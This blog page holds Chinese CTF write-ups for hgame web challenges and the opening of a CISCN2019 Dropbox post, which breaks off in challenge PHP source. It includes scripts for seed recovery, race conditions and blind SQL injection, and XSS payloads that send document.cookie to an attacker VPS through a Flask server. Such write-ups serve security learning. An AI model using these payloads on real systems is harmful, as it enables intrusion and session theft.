<p><img src="https://uploader.shimo.im/f/lvDVxivfoPoNl3Pz.png!thumbnail" alt></p>
<h2 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂!"></a>二发入魂!</h2><p><img src="https://uploader.shimo.im/f/50h6wePQuxMWsv3l.png!thumbnail" alt><br>刚看还以为是要把抽卡的数字在下面提交呢，后来才知道是要提交随机数种子<br>而且种子两秒一变，看这个篇文章<a href="https://www.anquanke.com/post/id/196831#h3-5" target="_blank" rel="noopener">无需暴破还原mt_rand()种子</a><br>大概意思就是知道同一个种子的第一个和第278个随机数，就可以算出种子<br><a href="https://github.com/ambionics/mt_rand-reverse/blob/master/reverse_mt_rand.py" target="_blank" rel="noopener">git源码</a><br>附上旺哥的脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://twoshot.hgame.n3ko.co/random.php?times=277"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=ildg7skp4kk9ledbbkgnlvo5t0"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url,headers=headers).json()</span><br><span class="line"></span><br><span class="line">arg0 = res[0]</span><br><span class="line">arg1 = res[227]</span><br><span class="line"><span class="built_in">print</span>(arg0)</span><br><span class="line"><span class="built_in">print</span>(arg1)</span><br><span class="line">result = os.popen(<span class="string">'python reverse_mt_rand.py &#123;0&#125; &#123;1&#125; 0 0'</span>.format(arg0, arg1))</span><br><span class="line">res = result.read()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://twoshot.hgame.n3ko.co/verify.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'ans'</span>:res</span><br><span class="line">&#125;</span><br><span class="line">result = requests.post(url,data=data,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure></p>
<p>不带cookie跑不出来</p>
<h2 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h2><p>条件竞争，可能是买了东西之后先计入库存再扣钱，然后在扣钱之前卖出去就行<br>附p3师傅脚本，膜<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://121.36.88.65:9999/API/?method="</span></span><br><span class="line"></span><br><span class="line">def action(action):</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        url_buy = url + action</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            <span class="string">"code"</span>:<span class="string">"800003"</span>,</span><br><span class="line">            <span class="string">"amount"</span>:<span class="string">"250"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=4s8uu8ad0eqqcnskrna7s2gma9"</span></span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            res = requests.post(url_buy, data=post_data, headers=header)</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">def thread_main(count):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count*2):</span><br><span class="line">        t = threading.Thread(target=action, args=(<span class="string">"solve"</span>,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count):</span><br><span class="line">        t = threading.Thread(target=action, args=(<span class="string">"buy"</span>,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    thread_main(250)</span><br></pre></td></tr></table></figure></p>
<h2 id="Cosmos的留⾔板-2"><a href="#Cosmos的留⾔板-2" class="headerlink" title="Cosmos的留⾔板-2"></a>Cosmos的留⾔板-2</h2><p>这道题很奇怪，注入点在delete_id，也不知道过滤了什么东西233，测试不出来<br>注入姿势第一次见，直接上师傅的脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url_mod = <span class="string">"http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=exp((select/**/case/**/when(&#123;0&#125;)then(99999)else(1)end))"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=s5kb5k11rm0lndtmgmib0vhg92"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload_mod = "ord(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload_mod = "ord(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name='user'),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># id,name,password</span></span><br><span class="line">payload_mod = <span class="string">"ord(substr((select/**/group_concat(name,0x7e,password)from/**/user),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># cosmos~f1FXOCnj26Fkadzt4Sqynf6O7CgR</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = 1</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    l_bound = 0; u_bound = 255</span><br><span class="line">    <span class="keyword">while</span> l_bound &lt;= u_bound:</span><br><span class="line">        m_bound = (l_bound + u_bound) //2</span><br><span class="line">        payload = payload_mod.format(index, m_bound)</span><br><span class="line">        url = url_mod.format(payload)</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        </span><br><span class="line">        res = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"失败"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            l_bound = m_bound + 1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = m_bound</span><br><span class="line">            u_bound = m_bound - 1</span><br><span class="line">    result += chr(tmp)</span><br><span class="line">    index += 1</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></p>
<p>exp函数有一个特点，当参数大于709时会引起一个溢出错误<br><img src="https://uploader.shimo.im/f/YCubfCYeF1IWAkdx.png!thumbnail" alt><br>然后就是select case when then else end 语句<br><img src="https://uploader.shimo.im/f/RFziU38fadI1MsGI.png!thumbnail" alt><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp报错注入，本地测有点问题，不确定能不能用</span><br><span class="line">mysql&gt; select exp(~(select*from(select user())x));  </span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range <span class="keyword">in</span> <span class="string">'exp(~((select '</span>root@localhost<span class="string">' from dual)))'</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h2><p>复制的官方wp233,仅作学习姿势<br>替换了 script 为<br>空，双写可以绕过。<br>但是发现输⼊<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scripscriptt&gt;alert(1)&lt;/scripscriptt&gt;</span><br></pre></td></tr></table></figure></p>
<p>之后并没有如愿弹框，⽽且控制台出现了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Refused to execute inline script because it violates the following Content</span><br><span class="line">Security Policy directive: <span class="string">"script-src 'self'"</span>. Either the <span class="string">'unsafe-inline'</span></span><br><span class="line">keyword, a <span class="built_in">hash</span> (<span class="string">'sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='</span>), or a</span><br><span class="line">nonce (<span class="string">'nonce-...'</span>) is required to <span class="built_in">enable</span> inline execution.</span><br></pre></td></tr></table></figure></p>
<p>说明输⼊被 CSP(Content Security Policy) 拦了，从返回头中可以看到本题的 CSP 策略为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src <span class="string">'self'</span>; script-src <span class="string">'self'</span></span><br></pre></td></tr></table></figure></p>
<p>它限制了内联 JS 脚本，并且限制了引⼊的静态资源⽂件只能从同域下加载。在实际应⽤中，遇到这种<br>CSP ⼀般是找该站是否有⽂件上传点，上传⼀个内容为 alert(/xss/) 的图⽚再引⽤，也可以同源下有<br>没有可以执⾏任意 JS 代码的 evil.js ⽂件。<br>本题中有⼀个接⼝ /send ，它会返回过滤后的消息内容，我们可以利⽤这个接⼝，在⼀次 send 中再引<br>⼊⼀次 send，向它传⼊参数，将它作为 JS ⽂件引⼊，即<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriscriptpt src=<span class="string">"/send?message=alert(1)"</span>&gt;&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h2><p>因为对xss了解甚少，记录一下week2的xss,完全复制的官方wp233<br>留⾔板过滤了所有闭合的html标签，即进⾏了⼀次 re.sub(“&lt;/?[^&gt;]+&gt;”, “”, message) 这样的替换<br>之后过滤了script、iframe，并且消息全部转化为⼤写 可以选择⽤浏览器事件执⾏js，不闭合右标签，<br>浏览器会起到⾃动补全的作⽤，最后加注释，注释掉后⾯拼过来的&lt;\/span&gt; ， ⼤写可以使⽤编码绕<br>过，然后只要找个vps或者外带数据的平台接收cookie就可以了<br>jsfuck来绕⼤写，后台bot⽤的selenium只⽀持get请求，jsfuck转换出来上万字符的payload就传不过去<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&amp;<span class="comment">#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104</span></span><br><span class="line">&amp;<span class="comment">#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;</span></span><br><span class="line"><span class="comment">#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47</span></span><br><span class="line">编码内的内容是 window.open(<span class="string">'http://vps-ip'</span>+document.cookie);//</span><br></pre></td></tr></table></figure></p>
<p>这题也可以选择引⼊外部⻚⾯，使⽤link标签可以引⼊⻚⾯，payload:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">"import"</span> href=<span class="string">"http://vps-ip/"</span></span><br></pre></td></tr></table></figure></p>
<p>这个做法仅限chrome，因为bot也是chrome，所以也可以选择这种做法 但是由于跨域问题，浏览器会拦截<br>跨域问题需要vps上的后端或服务器处理，⽐较⽅便的，可以python起⼀个⻚⾯，添加⼀个头<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">'*'</span></span><br></pre></td></tr></table></figure></p>
<p>就可以引⼊外部，拿到cookie<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">def hello_world():</span><br><span class="line"> response = make_response(<span class="string">"&lt;script&gt;window.open('http://vpsip/'+document.cookie)&lt;/script&gt;"</span>)</span><br><span class="line"> response.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">'*'</span></span><br><span class="line"> <span class="built_in">return</span> response</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> app.run(host=<span class="string">"0.0.0.0"</span>,port=80)</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/22/CISCN2019/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/22/CISCN2019/" itemprop="url">CISCN2019</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-22T20:45:27+08:00">
                2020-01-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Dropbox"><a href="#Dropbox" class="headerlink" title="Dropbox"></a>Dropbox</h2><p>先注册一个账号，登陆之后上传一个正常的图片，在测试下载功能的时候发现有任意文件下载<br>class.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">"127.0.0.1"</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">"root"</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">"root"</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">"dropbox"</span>;</span><br><span class="line"><span class="variable">$db</span> = new mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">        global <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> user_exist(<span class="variable">$username</span>) &#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">"s"</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === 0) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> add_user(<span class="variable">$username</span>, <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">"ss"</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> verify_user(<span class="variable">$username</span>, <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">"s"</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FileList &#123;</span><br><span class="line">    private <span class="variable">$files</span>;</span><br><span class="line">    private <span class="variable">$results</span>;</span><br><span class="line">    private <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$path</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;files = array();</span><br><span class="line">        <span class="variable">$this</span>-&gt;results = array();</span><br><span class="line">        <span class="variable">$this</span>-&gt;funcs = array();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">"."</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="built_in">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">".."</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="built_in">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        foreach (<span class="variable">$filenames</span> as <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = new File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __call(<span class="variable">$func</span>, <span class="variable">$args</span>) &#123;</span><br><span class="line">        array_push(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;files as <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;funcs as <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;results as <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            foreach (<span class="variable">$result</span> as <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;涓嬭浇&lt;/a&gt; / &lt;a href="#" class="delete"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File &#123;</span><br><span class="line">    public <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> open(<span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">name</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> basename(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">size</span></span>() &#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = array(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$size</span> &gt;= 1024 &amp;&amp; <span 